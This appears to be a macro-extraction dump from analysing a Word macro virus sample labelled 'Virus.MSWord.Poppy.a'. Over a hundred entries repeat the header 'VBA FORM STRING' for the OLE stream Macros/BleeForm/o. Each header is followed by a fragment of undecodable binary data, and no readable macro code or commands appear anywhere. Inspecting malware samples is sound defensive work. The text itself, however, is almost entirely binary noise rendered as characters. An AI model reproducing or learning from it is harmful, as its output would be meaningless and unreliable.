- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F3�X�]5��E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����' 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}A�}8*�_��F��%˴ږ9�$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3����s�y�9�{XC�x|U��O`��ࢍ#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�SlX�s~ӧڛI��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{����z�m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S;�C
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%��0D�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@^pI�G��:��-3�-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p���v��a�V�T�U�&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-Հ���T��'�Y�G�T�*;�i�Ǝ�O\�bV��@e��a��(��e-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��G�x�<��8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�麃�1�sC�Fݥ�V��K����:"�9+�#H"¯�'�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� d�c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
aOr���:h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����#w+�Z뷔����ȩEOX�f�^x�go�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�3��#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k�e-�j[�G\|�� �6&�a��eUݜ���9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� {e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �j�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��A�I^�p̚K�k䤅D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��pP�Ȼ�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�EJ�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�������:����]9�%��۪)�&򨠡�\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A�Q���Q}~��2�I4v�&������&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�mL|�9'�I�k�A:�_�gn��,��5қQ�=CPe��+=��r�S~��?t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@P��L�;�8��u��jj�껜�=}}sN�:�2I&K`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 \,�J��]H�7(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8��=) �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�C@;���ہ��^�
r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I)�d*G��=��ԃ��=8l��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l�+�u���&|.=��Ԕ�R��GϜ(<�}~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S���
I���a�=t�GOa��N���[�g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G<����Ao�ݪ,N�YNRi!a���;@8 ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��(�Kd�o�����w�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p~�:l�tI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H#�!�e�2�+��B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���O��`�G3����*i]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[u��t�	$�Y]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'to� +
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�T�l�;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��n�|Tr�6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�I��I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Рd�0K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ߪ��~�_���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S�-���q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�q�v�,i]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��M49�8����iǾq�z}2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�22���
9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����=�)^�hyc�r�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=���:�{��nˠ/��u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Z�0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ǯ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��́���n#�GsEc(t���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8$d�H�����ЋcҾO����F��)�o `���>��T-W��v�B�z�c���<T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tw�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?ZZ��u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:T��R�{��X*�\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
duUuL�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���\a�ٌ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*̨��5+�ֱ]t枈�i�X°�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g�>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o�>M��
�EW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���C�*��E�Oة�Dp�I%d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�Q�^��?��[�����ɀ��E55<���|�Z,�#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@>g��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��m5�~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X1H��1*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���3�=��n���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
UPQ1��A4���/�Ơ�~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O׬,�ߌ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���s]��7KSȦ{5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Kw��BM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s������[��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K�5��{zkrYem/~�G��h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a�s�'�݁�x C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��E*90�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k������7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R�ӵ�-EQ.���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n� *���?�G���Ee�_x{ṏl���+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p`K��dz�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WV����D��dJh�B�Ƀ�y��G��<zt�K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!P�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ź2�'����y-�VJ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+�7C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�w��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
LZ,64e���l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|��7��98?�R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�:��ȗ��}Ŏx���)>�(���8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�E�t��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�G�fJ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�4����$�u�`~�_O�V"w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ԫ�c�;�S���Gږ8Κ�r_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"6G'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}��s�Տ�]��C�ؠ�B�c����#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���G�Cg�H,�f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,ϒ�p��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_��J�#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x���B�G��~�ޘ�{t��)�"�tU0PF~"�Da@��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/��ӏ_�J?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�հ<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&Ѿm�N@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�9��U�諳�o��!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ޤ�Ӥ:�=h����m�Dn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�����r?���6R���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R����vi�&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�Gje�iܤ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3Ϧ	ǰ'9���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��߉�/4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��j�Gr�jUdR3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n���V]���k��I�2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
끐@�����X;}J�c�-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�
����݇
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������v���Ъ�)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$��m�*��=o?yt+I�`�����%K��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~
�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������CmX.r��qPU�%L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�g@HP�
-------------------------------------------------------------------------------
